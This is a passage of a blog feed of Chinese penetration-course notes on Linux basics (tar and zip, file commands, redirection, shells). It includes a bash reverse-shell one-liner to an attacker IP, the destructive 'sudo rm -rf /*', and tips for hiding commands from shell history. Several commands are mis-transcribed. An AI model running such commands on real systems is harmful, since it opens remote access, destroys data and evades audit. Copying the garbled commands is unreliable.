title="tar常用选项"></a>tar常用选项</h2><table><thead><tr><th>选项</th><th>作用</th><th>单词</th></tr></thead><tbody><tr><td>-c</td><td>创建打包文件</td><td>create</td></tr><tr><td>-v</td><td>显示打包或解包的详细信息</td><td>verbose</td></tr><tr><td>-f</td><td>指定文件名称，必须放到所有选项后面</td><td>file</td></tr><tr><td>-z</td><td>压缩或解压缩(.gz)</td><td></td></tr><tr><td>-j</td><td>压缩或解压缩(.bz2)</td><td></td></tr><tr><td>-x</td><td>解包</td><td></td></tr><tr><td>-C</td><td>解压缩到指定目录</td><td></td></tr></tbody></table><p><a name="xYS7n"></a></p><h2 id="tar用法示例"><a href="#tar用法示例" class="headerlink" title="tar用法示例"></a>tar用法示例</h2><table><thead><tr><th>操作</th><th>命令示例</th></tr></thead><tbody><tr><td>打包(不压缩)</td><td>tar -cvf test.tar test/</td></tr><tr><td>解包</td><td>tar -xvf test.tar</td></tr><tr><td>打包并gz压缩</td><td>tar -zcvf test.tar.gz test/</td></tr><tr><td>解压</td><td>tar-zxvf test.tar.gz</td></tr><tr><td>解压到指定目录</td><td>tar -zxvf test.tar.gz -C aaa</td></tr><tr><td>打包并bz2压缩</td><td>tar -jcvf test.tar.bz2 test/</td></tr><tr><td>解压</td><td>tar -jxvf test.tar.bz2 test/</td></tr><tr><td>解压到指定目录</td><td>tar -jxvf test.tar.bz2 test/ -C aaa</td></tr></tbody></table><p><a name="egqUU"></a></p><h2 id="tar其他操作"><a href="#tar其他操作" class="headerlink" title="tar其他操作"></a>tar其他操作</h2><table><thead><tr><th>操作</th><th>命令示例</th></tr></thead><tbody><tr><td>仅查看不解压</td><td>tar -tf test.tar</td></tr><tr><td>追加文件</td><td>tar -rf test.tar *.gif</td></tr><tr><td>替换文件</td><td>tar -uf test.tar huaji.gif</td></tr><tr><td>加密</td><td>tar -zcf - *.txt</td></tr><tr><td>解密</td><td>ddjf=test.des3 lopenssl des3 -d -k 123456</td></tr></tbody></table><p><a name="GBHZh"></a></p><h2 id="zip用法示例"><a href="#zip用法示例" class="headerlink" title="zip用法示例"></a>zip用法示例</h2><table><thead><tr><th>操作</th><th>命令示例</th></tr></thead><tbody><tr><td>压缩</td><td>zip test.zip *.txt</td></tr><tr><td>解压缩</td><td>unzip test.zip</td></tr><tr><td>解压缩到指定目录</td><td>unzip test.zip -d bbb</td></tr><tr><td>添加密码</td><td>zip -rP 123456 test.zip *.txt</td></tr><tr><td>使用密码解压</td><td>unzip -P 123456 test.zip</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-5-Linux文件和目录管理</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-5-wen-jian-yu-mu-lu-guan-li/ke-shi-1-5-linux-wen-jian-he-mu-lu-guan-li/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-5-wen-jian-yu-mu-lu-guan-li/ke-shi-1-5-linux-wen-jian-he-mu-lu-guan-li/</url>
      
        <content type="html"><![CDATA[<p><a name="bVqdZ"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>列出目录</li><li>打印工作路径</li><li>切换工作路径</li><li>查看文件类型</li><li>复制文件或目录</li><li>查找文件或者目录</li><li>创建目录</li><li>移动或者重命名</li><li>删除文件或目录</li><li>创建空文件</li><li>软链接和硬链接</li><li>挂载</li></ol><p><a name="zDUTW"></a></p><h1 id="常规命令格式"><a href="#常规命令格式" class="headerlink" title="常规命令格式"></a>常规命令格式</h1><p>Command   Options   Arguments<br>命令               选项           参数</p><blockquote><p>rm -rf /*<br>-r递归<br>-f强制</p></blockquote><p>Options选项:命令的行为方式<br>Arguments参数:命令的对象 <a name="ndgS6"></a></p><h2 id="Linux怎么删库跑路"><a href="#Linux怎么删库跑路" class="headerlink" title="Linux怎么删库跑路?"></a>Linux怎么删库跑路?</h2><p>打开系统Terminal(终端)输入:</p><table><thead><tr><th>sudo</th><th>rm</th><th>-rf</th><th>/*</th></tr></thead><tbody><tr><td>以系统管理员的身份执行</td><td>ReMove   移除</td><td>递归，强制</td><td>目最下所有文件</td></tr></tbody></table><p>以系统管理者的身份移除Rubbish Flies目录下的所有文件\ <a name="ggfpV"></a></p><h2 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h2><ul><li>命令</li><li>空格</li><li>大小写</li><li>顺序 <a name="I1oJq"></a></li></ul><h2 id="命令选项详细参考资料"><a href="#命令选项详细参考资料" class="headerlink" title="命令选项详细参考资料"></a>命令选项详细参考资料</h2><p><a href="https://wangchujiang.com/linux-command">https://wangchujiang.com/linux-command</a><br><a href="https://www.linuxcool.com.com/">https://www.linuxcool.com</a></p><p><a name="FX22Q"></a></p><h1 id="文件和目录管理"><a href="#文件和目录管理" class="headerlink" title="文件和目录管理"></a>文件和目录管理</h1><p><a name="er8g0"></a></p><h2 id="列出目录内容和属性"><a href="#列出目录内容和属性" class="headerlink" title="列出目录内容和属性"></a>列出目录内容和属性</h2><p>命令: Is<br>全拼: list<br>格式: Is 选项 文件名<br>例:<br>ls -a<br>lI –block-size=M</p><p><a name="jam3z"></a></p><h2 id="打印工作路径"><a href="#打印工作路径" class="headerlink" title="打印工作路径"></a>打印工作路径</h2><p>命令. pwd<br>全拼: print working directory<br>格式: pwd</p><p><a name="x8JMT"></a></p><h2 id="切换工作目录"><a href="#切换工作目录" class="headerlink" title="切换工作目录"></a>切换工作目录</h2><p>命令: cd<br>全拼: change directory<br>格式: cd相对路径或者绝对路径</p><table><thead><tr><th>符号</th><th>指代</th></tr></thead><tbody><tr><td>绝对路径</td><td>由根目录 / 开始写起</td></tr><tr><td>相对路径</td><td>从当前所在的工作目录开始写起</td></tr><tr><td><code>/</code></td><td>根目录</td></tr><tr><td><code>.</code></td><td>代表当前目录</td></tr><tr><td><code>~</code></td><td>代表用户工作目录，vim ~/.bashrc</td></tr><tr><td><code>../</code></td><td>代表上一-级目录</td></tr><tr><td><code>../../</code></td><td>上上一级目录，以此类推，超出范围的时候代表根目录</td></tr></tbody></table><p><a name="Mw8R1"></a></p><h2 id="查看文件类型"><a href="#查看文件类型" class="headerlink" title="查看文件类型"></a>查看文件类型</h2><p>命令: file<br>格式: file 选项 文件或目录<br>file -i 文件名 <a name="yfnq6"></a></p><h2 id="复制文件或目录"><a href="#复制文件或目录" class="headerlink" title="复制文件或目录"></a>复制文件或目录</h2><p>命令: cp<br>全拼: copy<br>格式: cp 选项源文件 目标文件</p><p>-R/r:递归处理，将指定目录下的所有文件与子目录一并处理;<br>-f: 强行复制文件或目录，不论目标文件或目录是否已存在;</p><p><a name="UunOw"></a></p><h2 id="查找文件或者目录"><a href="#查找文件或者目录" class="headerlink" title="查找文件或者目录"></a>查找文件或者目录</h2><p>find<br>格式: find 目录 选项 名字或模式</p><p>-name 名字<br>find /etc -name a*<br>find / -name “aaa” 2&gt; /dev/null</p><p>-type类型参数<br>f 普通文件, d目录<br>find /root -type f</p><p>-size大小<br>find /root -type f -size 10M</p><p>-exec command<br>把find找到的内容作为命令的参数去执行<br>{}就是找到的内容<br>find . -name “*.txt” -exec rm -rf{} ; (包括子目录)<br>find . -name aaa -exec mv {} bbb ;</p><p><a name="tGqdL"></a></p><h3 id="其他查找命令"><a href="#其他查找命令" class="headerlink" title="其他查找命令"></a>其他查找命令</h3><p>whereis :查找二进制程序、代码等相关文件路径<br>which:查找并显示给定命令的绝对路径<br>locate: updatedb程序每天会跑一次，建立文件索引 <a name="OUltD"></a></p><h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><p>命令:mkdir<br>全拼: make direcotry<br>格式: mkdir选项目录名<br>mkdir test<br>mkdir -p /usr/local/soft/redis</p><p>-p 创建多级目录</p><p><a name="Ys95f"></a></p><h2 id="移动或者重命名"><a href="#移动或者重命名" class="headerlink" title="移动或者重命名"></a>移动或者重命名</h2><p>命令: mv<br>全拼: move<br>格式: mv选项 原文件 新文件<br>mv 1.txt 2.txt<br>mv /a/1.txt /b/1.txt <a name="kS2an"></a></p><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p>命令: rm<br>全拼: remove<br>格式: rm 选项(多个)文件名<br>删除空目录: rmdir<br>-r 递归(连同子文件夹一起删除)<br>-f 强制删除<br>find . -name “a.json” -exec rm -rf {}</p><p><a name="QTFeJ"></a></p><h2 id="创建空文件"><a href="#创建空文件" class="headerlink" title="创建空文件"></a>创建空文件</h2><p>命令: touch<br>格式: touch 选项 文件名<br>touch a.txt <a name="kbti7"></a></p><h2 id="挂载mount"><a href="#挂载mount" class="headerlink" title="挂载mount"></a>挂载mount</h2><p>问题: -个目录树怎么使用多个磁盘?<br>原路径: /dev/sdb1 挂载到: /sdb-u<br>mkdir /sdb-u<br>mount /dev/sdb1 /sdb-u</p><p><a name="UKbhI"></a></p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>命令: In<br>全拼: link<br>格式: In 源文件 链接文件 <a name="bAeQW"></a></p><h3 id="创建硬链接"><a href="#创建硬链接" class="headerlink" title="创建硬链接:"></a>创建硬链接:</h3><p>In 1.php hard.php<br>vim hard.php<br>cat 1.php<br>注意:<br>1、用户不能给目录创建硬链接<br>2、只有相同的文件系统才可以创建硬链接(tmpfs NTFS FAT32) <a name="WS95b"></a></p><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><p>查看软链接:<br>II /usr/bin/nc<br>创建软链接:&amp;#x20;<br>In -s /usr/local/phpstudy/system/phpstudyctl /usr/bin/study<br>使用:<br>study</p><p>源文件删除，软连接失效</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时3-4.3-文件描述符和重定向</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-3-4.3-wen-jian-miao-shu-fu-he-chong-ding-xiang/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-3-4.3-wen-jian-miao-shu-fu-he-chong-ding-xiang/</url>
      
        <content type="html"><![CDATA[<p><a name="zETHm"></a></p><h1 id="文件描述符-File-Descriptor"><a href="#文件描述符-File-Descriptor" class="headerlink" title="文件描述符 File Descriptor"></a>文件描述符 File Descriptor</h1><table><thead><tr><th>ID</th><th>描述</th><th>设备</th></tr></thead><tbody><tr><td>0</td><td>标准输入(stdin)</td><td>键盘</td></tr><tr><td>1</td><td>标准输出(stdout)</td><td>显示器</td></tr><tr><td>2</td><td>标准错误输出(stderr)</td><td>显示器</td></tr></tbody></table><p><a name="yGRgE"></a></p><h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><table><thead><tr><th>符号</th><th>类别</th></tr></thead><tbody><tr><td>&gt;和&gt;&gt;</td><td>输出重定向</td></tr><tr><td>&amp;&gt;</td><td>表示将一个流(stream)重定向到另一个文件描述符(file descriptor)</td></tr><tr><td>&lt;和&lt;&lt;</td><td>输入重定向</td></tr></tbody></table><p>重定向:改变输入输出的方向</p><p><a name="t8iIu"></a></p><h2 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h2><table><thead><tr><th>类别</th><th>命令格式</th><th>示例</th></tr></thead><tbody><tr><td>标准输出</td><td></td><td></td></tr><tr><td>重定向</td><td>command &gt;file</td><td>Is / 1&gt; test.txt (1可以省略)</td></tr><tr><td></td><td>command &gt;&gt;file</td><td>Is / 1&gt;&gt;test.txt (1可以省略)</td></tr><tr><td>标准错误输出</td><td></td><td></td></tr><tr><td>重定向</td><td>command 2&gt;file</td><td>find / -name “aaa” 2&gt;err.txt</td></tr><tr><td></td><td>command 2&gt;&gt; file</td><td>find / -name “aaa” 2&gt;/dev/null</td></tr><tr><td>输出和错误重定向</td><td>command &gt;file 2&gt;&amp;1</td><td>find / -name “aaa” &gt;test.txt 2&gt;&amp;1</td></tr></tbody></table><p>注释：&gt;会覆盖内容，&gt;&gt;是追加内容 <a name="HNewB"></a></p><h2 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h2><table><thead><tr><th>命令格式</th><th>示例</th></tr></thead><tbody><tr><td>command &lt; file</td><td>将file文件中的内容作为command的输入(省略了0)</td></tr><tr><td>command &lt; END</td><td>从标准输入(键盘)中读取数据，直到遇见分界符END才停止</td></tr><tr><td>command &lt; file1 &gt; file2</td><td>将file1作为command的输入，并将command的处理结果输出到file2</td></tr><tr><td>wc -l &lt; test.txt</td><td>统计test.txt文件中有多少行文本</td></tr><tr><td>wc -l &lt;&lt; END</td><td>统计用户在终端输入的文本的行数</td></tr></tbody></table><p><a name="iwGNl"></a></p><h4 id="bash反弹连接案例"><a href="#bash反弹连接案例" class="headerlink" title="bash反弹连接案例"></a>bash反弹连接案例</h4><p><code>bash -i &gt;&amp; /dev/tcp/192.168.142.44/7777 0&gt;&amp;1</code></p><p>bash -i 在靶机打开交互式的Shell<br>/dev/tcp/192.168.142.44/7777 连接到攻击机IP端口<br>&gt;&amp;和&amp;&gt;等价，代表标准输出1 +错误输出2;把靶机的输出重定向到攻击机——接收结果用。<br>0&gt;&amp;1，左边是标准输入。右边是标准输出，输出重定向。把靶机的输入重定向为攻击机的输出——接收命令用。<br>所以，靶机的输入输出都到了攻击机上。</p><pre><code>echo HISTCONTROL=ignorespace &gt;&gt; ~/.bashrcsource ~/.bashrcvim ~/.bashrchistory  cd .history空两格输入命令后，不会记录在history中</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-4.2-Linux常用操作</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-2-4.2-linux-chang-yong-cao-zuo/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-2-4.2-linux-chang-yong-cao-zuo/</url>
      
        <content type="html"><![CDATA[<p><a name="PHHuF"></a></p><h2 id="命令帮助"><a href="#命令帮助" class="headerlink" title="命令帮助"></a>命令帮助</h2><p>man command (manual)——具体参数和使用方法<br>whatis command——命令的简要说明<br>info command——详细介绍<br>help command——Linux内置 命令</p><p><a name="Q0jFu"></a></p><h2 id="关机重启-root用户"><a href="#关机重启-root用户" class="headerlink" title="关机重启(root用户)"></a>关机重启(root用户)</h2><p>关机&amp;#x20;<br><code>poweroff</code><br><code>shutdown -h now</code><br><code>halt -p</code><br>重启:<br><code>reboot</code> <a name="UGT3s"></a></p><h2 id="快捷键和命令-1"><a href="#快捷键和命令-1" class="headerlink" title="快捷键和命令-1"></a>快捷键和命令-1</h2><table><thead><tr><th>操作</th><th>作用</th></tr></thead><tbody><tr><td>Tab键</td><td>补全命令和目录(自动提示)</td></tr><tr><td>方向键</td><td>上一条命令:↑;下一条命令↓</td></tr><tr><td>Ctrl + r</td><td>搜索历史命令，回车执行</td></tr><tr><td>!cd:</td><td>重复执行最近一次，以cd开头的历史命令</td></tr><tr><td>Ctrl + Insert</td><td>复制</td></tr><tr><td>Shift + Insert</td><td>粘贴</td></tr><tr><td>Alt + Insert</td><td>复制并粘贴</td></tr></tbody></table><p><a name="lPHDQ"></a></p><h2 id="快捷键和命令-2"><a href="#快捷键和命令-2" class="headerlink" title="快捷键和命令-2"></a>快捷键和命令-2</h2><table><thead><tr><th>操作</th><th>作用</th></tr></thead><tbody><tr><td>Ctrl+E</td><td>光标移动到行位</td></tr><tr><td>Ctrl+A</td><td>光标移动到行首</td></tr><tr><td>Ctrl+K</td><td>清除光标后至行尾的内容</td></tr><tr><td>Ctrl+U</td><td>清除光标前至行首间的所有内容</td></tr><tr><td><code>clear</code></td><td>清屏，但是命令都还在</td></tr><tr><td><code>history</code></td><td>查看历史命令</td></tr><tr><td><code>history -C</code></td><td>清除历史命令kali: echo &gt; ~/.zsh_ history</td></tr></tbody></table><p><a name="s2GuG"></a></p><h2 id="别名配置alias"><a href="#别名配置alias" class="headerlink" title="别名配置alias"></a>别名配置alias</h2><p>查看别名: alias<br>设置别名(以bash为例) : vim ~/.bashrc<br>格式: alias short= ‘xx;xxx’<br>生效: source ~/.bashrc</p><p><a name="CbeNC"></a></p><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><table><thead><tr><th>符号</th><th>指代</th></tr></thead><tbody><tr><td>*</td><td>任意字符</td></tr><tr><td>?</td><td>单个字符</td></tr><tr><td>[]</td><td>括号里面可选一个， 比如[0-9][a-z]</td></tr><tr><td>{}</td><td>多个 ll {.log,*.txt}</td></tr><tr><td>^</td><td>取反</td></tr></tbody></table><p><a name="WyAoe"></a></p><h2 id="系统环境变量"><a href="#系统环境变量" class="headerlink" title="系统环境变量"></a>系统环境变量</h2><p>环境变量的作用?<br>查看全部变量: env<br>查看单个变量: echo $XXX<br>用户变量: ~/.bashrc<br>系统变量: /etc/profile</p><p><a name="zKT8X"></a></p><h3 id="案例-设置JDK环境变量"><a href="#案例-设置JDK环境变量" class="headerlink" title="案例:设置JDK环境变量"></a>案例:设置JDK环境变量</h3><p>vim /etc/profile</p><p><code>export JAVA_HOME=/usr/local/soft/java/jdk1.8.0_74</code><br><code>export PATH=$JAVA_HOME/bin:$PATH</code><br><code>export CLASSPATH=.:$JAVA_ HOME/ib/dt.jar:$JAVA_HOME/ib/tools.jar</code></p><p>source /etc/ profile</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-4.1-Linux系统结构</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-1-4.1-linux-xi-tong-jie-gou/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-1-4.1-linux-xi-tong-jie-gou/</url>
      
        <content type="html"><![CDATA[<p><a name="eWhzn"></a></p><h1 id="Linux系统结构"><a href="#Linux系统结构" class="headerlink" title="Linux系统结构"></a>Linux系统结构</h1><ol><li>内核</li><li>Shell</li><li>文件系统</li><li>应用程序</li></ol><p><a name="Spyfi"></a></p><h2 id="Linux操作系统内核"><a href="#Linux操作系统内核" class="headerlink" title="Linux操作系统内核"></a>Linux操作系统内核</h2><ol><li>管理进程</li><li>管理内存</li><li>管理驱动</li><li>管理文件和网络</li></ol><p><a name="GwWxj"></a></p><h2 id="Linux-Shell"><a href="#Linux-Shell" class="headerlink" title="Linux Shell"></a>Linux Shell</h2><p>w.vipc9.com<br>接收用户的命令，经过转换，交给内核去执行<br>cat -&gt; open() read()<br>1、简化操作<br>2、安全 <a name="l6gbD"></a></p><h3 id="Linux-Shell工具"><a href="#Linux-Shell工具" class="headerlink" title="Linux Shell工具"></a>Linux Shell工具</h3><table><thead><tr><th>名称</th><th>程序路径</th><th>作者</th></tr></thead><tbody><tr><td>bourne Shell</td><td>/usr/bin/sh或/bin/sh</td><td>Stephen Bourne</td></tr><tr><td>C Shell</td><td>/usr/bin/csh</td><td>Bill Joy</td></tr><tr><td>K Shell</td><td>/usr/bin/ksh</td><td>David Korn</td></tr><tr><td>Bourne Again Shell</td><td>/bin/bash</td><td>Brian Fox</td></tr><tr><td>Z Shell</td><td>/bin/zsh或/usr/bin/zsh</td><td>Paul Falstad</td></tr></tbody></table><p>Windows: cmd、Power Shell</p><pre class="line-numbers language-none"><code class="language-none">[root@xuegod63 ~]# echo $SHELL/bin/bash[root@xuegod63 ~]# cat /etc/shells/bin/sh/bin/bash/sbin/nologin/usr/bin/sh/usr/bin/bash/usr/sbin/nologin/bin/tcsh/bin/csh[root@xuegod63 ~]# chsh -l/bin/sh/bin/bash/sbin/nologin/usr/bin/sh/usr/bin/bash/usr/sbin/nologin/bin/tcsh/bin/csh切换当用户shell：[root@xuegod63 ~]# chsh -s /bin/csh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="tXuWe"></a></p><h3 id="Shell和Terminal"><a href="#Shell和Terminal" class="headerlink" title="Shell和Terminal"></a>Shell和Terminal</h3><table><thead><tr><th>敲字</th><th>看</th><th></th></tr></thead><tbody><tr><td>bash</td><td></td><td></td></tr><tr><td>解析和翻译用户输入</td><td>terminal</td><td></td></tr><tr><td>接受输入，并绘制输出</td><td>壳Shell</td><td></td></tr><tr><td>系统调用</td><td>stdout/stderr</td><td></td></tr><tr><td>操作系统</td><td></td><td>核Kernel</td></tr></tbody></table><p><a name="Wdcbv"></a></p><h3 id="Shell编程-x2F-Shell脚本-sh"><a href="#Shell编程-x2F-Shell脚本-sh" class="headerlink" title="Shell编程/Shell脚本(.sh)"></a>Shell编程/Shell脚本(.sh)</h3><p><a name="nJ74C"></a></p><h2 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h2><p>“一切皆文件”<br>普通文件、目录、进程(/proc) 、输入输出设备(/dev) 、网络字节流socket、 链接文件w.管道文件</p><table><thead><tr><th>查看文件</th><th>作用</th></tr></thead><tbody><tr><td>lsof /bin/bash</td><td>查找某个文件相关的进程</td></tr><tr><td>Isof -u root</td><td>列出某个用户打开的文件信息</td></tr><tr><td>Isof -C redis</td><td>列出某个程序进程所打开的文件信息</td></tr><tr><td>Isof -i tcp</td><td>列出所有tcp网络连接信息</td></tr></tbody></table><p><a name="wxcvg"></a></p><h2 id="Linux目录"><a href="#Linux目录" class="headerlink" title="Linux目录"></a>Linux目录</h2><p>蓝色表示目录;<br>绿色表示可执行文件;<br>红色表示压缩文件;<br>浅蓝色表示链接文件;<br>白色表示其他文件:<br>xxx是设备文件，包括block, char, ffo.</p><p><a name="AtizJ"></a></p><h3 id="根目录文件-1"><a href="#根目录文件-1" class="headerlink" title="根目录文件-1"></a>根目录文件-1</h3><table><thead><tr><th>目录</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>bin</td><td>存放普通用户可执行的指令</td><td>即使在单用户模式下也能够执行处理</td></tr><tr><td>boot</td><td>开机引导目录</td><td>包括Linux内核文件与开机所需要的文件</td></tr><tr><td>dev</td><td>设备目录</td><td>所有的硬件设备及周边均放置在这个设备目录中，比如声卡、磁盘</td></tr><tr><td>etc</td><td>各种配置文件目录</td><td>大部分配置属性均存放在这里</td></tr><tr><td>lib</td><td>库文件存放地，bin和sbin需要的库文件</td><td>类似windows的DLL</td></tr><tr><td>media</td><td>可移除设备挂载目录</td><td>类似U盘、光盘、移动硬盘等临时挂放目录</td></tr></tbody></table><p><a name="gPh9x"></a></p><h3 id="根目录文件-2"><a href="#根目录文件-2" class="headerlink" title="根目录文件-2"></a>根目录文件-2</h3><table><thead><tr><th>目录</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>mnt</td><td>用房临时挂载其他的文件系统</td><td>额外的设备可挂载在这里,相对临时而言</td></tr><tr><td>opt</td><td>第三方软件安装目录</td><td>现在习惯性的放置在/usr/local中</td></tr><tr><td>proc</td><td>虚拟文件系统</td><td>通常是内存中的映射，特别注意在误删除数据文件后，比如DB,只要系统不重启，还是有很大几率能将数据找回来</td></tr><tr><td>root</td><td>系统管理员主目录</td><td>除root之外,其他用户均放置在/home目录下</td></tr><tr><td>run</td><td>系统运行时所需文件</td><td>以前防止在/ar/run中,后来拆分成独立的/run目录。</td></tr><tr><td>重启后重新生成对应的目录数据</td><td></td><td></td></tr></tbody></table><p><a name="vHPE8"></a></p><h3 id="根目录文件-3"><a href="#根目录文件-3" class="headerlink" title="根目录文件-3"></a>根目录文件-3</h3><table><thead><tr><th>目录</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>sbin</td><td>只有5eot才能运行的管理指令</td><td>跟bin类似,但只属于root管理员</td></tr><tr><td>srv</td><td>服务启动后需要访问的数据目录</td><td>&amp;#x20;</td></tr><tr><td>&amp;#x20;</td><td></td><td></td></tr><tr><td>sys</td><td>跟proc-样，虚拟文件系统</td><td>记录核心系统硬件信息</td></tr><tr><td>tmp</td><td>存放临时文件目录</td><td>所有用户对该目录均可读写</td></tr><tr><td>usr</td><td>应用程序放置目录</td><td></td></tr><tr><td>var</td><td>存放系统执行过程经常改变的文件</td><td></td></tr></tbody></table><p><a name="AIrA3"></a></p><h3 id="用户主目录"><a href="#用户主目录" class="headerlink" title="用户主目录"></a>用户主目录</h3><p>主目录: home directory<br>root用户的主目录是/root<br>其他用户的主目录是/home/用户名<br>cd空格或者cd ~<br>工作目录: working directory</p><p><a name="TRfgn"></a></p><h3 id="目录指代"><a href="#目录指代" class="headerlink" title="目录指代"></a>目录指代</h3><table><thead><tr><th>符号</th><th>指代</th></tr></thead><tbody><tr><td>绝对路径</td><td>由根目录/开始写起</td></tr><tr><td>相对路径</td><td>从当前所在的工作目录开始写起</td></tr><tr><td><code>/</code></td><td>根目录</td></tr><tr><td><code>.</code></td><td>代表当前目录</td></tr><tr><td><code>~</code></td><td>代表用户工作目录，vim ~/.bashrc</td></tr><tr><td><code>../</code></td><td>代表上一-级目录</td></tr><tr><td><code>../../</code></td><td>上上一级目录，以此类推，超出范围的时候代表根目录</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时9-3.5.5-Xshell连接CentOS</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-9-3.5.5-xshell-lian-jie-centos/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-9-3.5.5-xshell-lian-jie-centos/</url>
      
        <content type="html"><![CDATA[<p><a name="FiC8A"></a></p><h1 id="Xshell远程连接"><a href="#Xshell远程连接" class="headerlink" title="Xshell远程连接"></a>Xshell远程连接</h1><p>Xshell .<br>FinalShell (国产免费)<br>MobaXterm<br>SecureCRT</p><p>添加连接<br>修改编码解决中文乱码<br>窗口排列 <a name="UlqY3"></a></p><h1 id="xshell全家桶"><a href="#xshell全家桶" class="headerlink" title="xshell全家桶."></a>xshell全家桶.</h1><p>链接: <a href="https://pan.baidu.com/s/16nkDC5_w02uOF3RYuBQH1Q?pwd=8888">https://pan.baidu.com/s/16nkDC5_w02uOF3RYuBQH1Q?pwd=8888</a><br>提取码: 8888<br>备注:如果报错缺少dll ( VC+ +环境的问题,有360的情况下会自动安装),就去官网下一个<br>最新版,或者改用FinalShell或者MobaXterm<br>家庭免费版: <a href="https://www.xshell.com/zh/free-for-home-school/">https://www.xshell.com/zh/free-for-home-school/</a></p><p><a name="qJ6Ou"></a></p><h1 id="jdk-11-0-11-windows-x64-bin-zip"><a href="#jdk-11-0-11-windows-x64-bin-zip" class="headerlink" title="jdk- 11.0.11_windows-x64_bin.zip"></a>jdk- 11.0.11_windows-x64_bin.zip</h1><p>链接:<a href="https://pan.baidu.com/s/1h_e_rKkj6bKug5fKwtn6Pg?pwd=8888">https://pan.baidu.com/s/1h_e_rKkj6bKug5fKwtn6Pg?pwd=8888</a><br>提取码: 8888</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时8-3.5.4-CentOS修改yum源</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-8-3.5.4-centos-xiu-gai-yum-yuan/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-8-3.5.4-centos-xiu-gai-yum-yuan/</url>
      
